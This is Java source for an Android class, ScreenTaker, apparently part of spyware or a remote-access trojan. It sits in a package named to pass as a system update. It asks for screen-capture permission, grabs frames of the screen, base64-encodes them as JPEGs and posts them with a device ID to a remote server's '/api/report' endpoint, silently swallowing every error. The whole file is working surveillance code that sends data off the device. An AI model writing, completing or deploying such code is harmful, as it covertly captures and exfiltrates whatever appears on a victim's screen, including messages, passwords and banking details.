package com.android.system.update;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenTaker {

    private static MediaProjectionManager mpm;
    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static int width, height, density;

    public static void requestPermission(Context ctx) {
        try {
            mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                Intent intent = mpm.createScreenCaptureIntent();
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    public static void onActivityResult(Context ctx, int resultCode, Intent data) {
        if (resultCode == Activity.RESULT_OK && data != null && mpm != null) {
            mediaProjection = mpm.getMediaProjection(resultCode, data);
            if (mediaProjection != null) {
                setupVirtualDisplay(ctx);
            }
        }
    }

    private static void setupVirtualDisplay(Context ctx) {
        try {
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);
        } catch (Exception ignored) {}
    }

    public static void takeScreenshot(Context ctx, String deviceId, String base) {
        if (mediaProjection == null || imageReader == null) {
            try {
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", "screen_error");
                o.put("body", "Нет разрешения на скриншот.");
                Net.post(base + "/api/report", o.toString());
            } catch (Exception ignored) {}
            return;
        }

        Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(() -> {
            try (Image image = imageReader.acquireLatestImage()) {
                if (image == null) return;
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                byte[] bytes = baos.toByteArray();

                String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", "screen");
                o.put("body", b64);
                Net.post(base + "/api/report", o.toString());
                
                bitmap.recycle();
            } catch (Exception ignored) {}
        }, 500);
    }
}
